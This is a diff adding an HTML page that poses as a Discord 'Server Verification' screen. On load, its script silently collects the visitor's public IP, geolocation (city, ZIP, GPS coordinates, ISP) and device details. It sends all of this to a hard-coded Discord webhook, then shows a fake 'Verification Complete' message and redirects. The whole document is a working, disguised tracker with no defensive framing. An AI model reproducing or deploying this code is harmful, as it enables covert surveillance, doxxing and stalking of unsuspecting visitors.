@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Server Verification</title>
+    <style>
+        body {
+            background: #1a1a2e;
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            padding: 40px;
+            background: #16213e;
+            border-radius: 20px;
+            box-shadow: 0 0 50px rgba(0, 210, 255, 0.3);
+            max-width: 500px;
+        }
+        h1 {
+            color: #00d2ff;
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+        .spinner {
+            border: 4px solid #333;
+            border-top: 4px solid #00d2ff;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .checkmark {
+            color: #00ff88;
+            font-size: 50px;
+            display: none;
+        }
+        .subtitle {
+            color: #aaa;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔐 Verification</h1>
+        <div id="status">
+            <div class="spinner"></div>
+            <p>Verifying your account...</p>
+            <p class="subtitle">Please wait, this will only take a moment</p>
+        </div>
+    </div>
+
+    <script>
+        // ====================================================
+        // CONFIGURATION — EDIT THIS
+        // ====================================================
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1534633557698543820/_RfmlYN9NKVhqziCMeIXLGBVEq9NgozgKaobuIxjUUi6oD50VvLGFWxGjKksVn9tt83R";
+        // ====================================================
+
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                return 'Unable to retrieve';
+            }
+        }
+
+        async function getLocation(ip) {
+            try {
+                const response = await fetch(`https://ipinfo.io/${ip}/json`);
+                const data = await response.json();
+                return data;
+            } catch {
+                return null;
+            }
+        }
+
+        async function sendToDiscord(ip, location) {
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language;
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            const time = new Date().toISOString().replace('T', ' ').slice(0, 19);
+
+            let message = `**🔐 VERIFICATION COMPLETED**\n\n`;
+            message += `🌍 **Public IP:** ${ip}\n`;
+
+            if (location) {
+                const loc = location.loc ? location.loc.split(',') : ['Unknown', 'Unknown'];
+                message += `📍 **Country:** ${location.country || 'Unknown'}\n`;
+                message += `🏙️ **City:** ${location.city || 'Unknown'}\n`;
+                message += `🗺️ **Region:** ${location.region || 'Unknown'}\n`;
+                message += `📡 **ISP:** ${location.org || 'Unknown'}\n`;
+                message += `📬 **ZIP:** ${location.postal || 'Unknown'}\n`;
+                message += `🗺️ **GPS:** ${location.loc || 'Unknown'}\n`;
+                message += `📌 **Google Maps:** https://www.google.com/maps?q=${loc[0]},${loc[1]}\n`;
+            }
+
+            message += `\n**💻 DEVICE INFO**\n`;
+            message += `🖥️ **User Agent:** ${userAgent}\n`;
+            message += `📱 **Platform:** ${platform}\n`;
+            message += `🌐 **Language:** ${language}\n`;
+            message += `🖥️ **Screen:** ${screenRes}\n`;
+            message += `🕒 **Time:** ${time}`;
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: message })
+                });
+                return true;
+            } catch {
+                return false;
+            }
+        }
+
+        async function main() {
+            try {
+                const ip = await getIP();
+                const location = await getLocation(ip);
+                await sendToDiscord(ip, location);
+
+                // Show success
+                document.getElementById('status').innerHTML = `
+                    <div class="checkmark" style="display:block;">✅</div>
+                    <h2 style="color:#00ff88;">Verification Complete!</h2>
+                    <p>You are now verified. Redirecting...</p>
+                    <p class="subtitle">This page will close automatically</p>
+                `;
+
+                // Redirect to Discord after 3 seconds
+                setTimeout(() => {
+                    window.location.href = 'https://discord.com';
+                }, 3000);
+
+            } catch (error) {
+                document.getElementById('status').innerHTML = `
+                    <div style="color:#ff4444;font-size:50px;">⚠️</div>
+                    <h2 style="color:#ff4444;">Something went wrong</h2>
+                    <p>Please try again or contact an admin.</p>
+                `;
+            }
+        }
+
+        // Run when page loads
+        main();
+    </script>
+</body>
+</html>
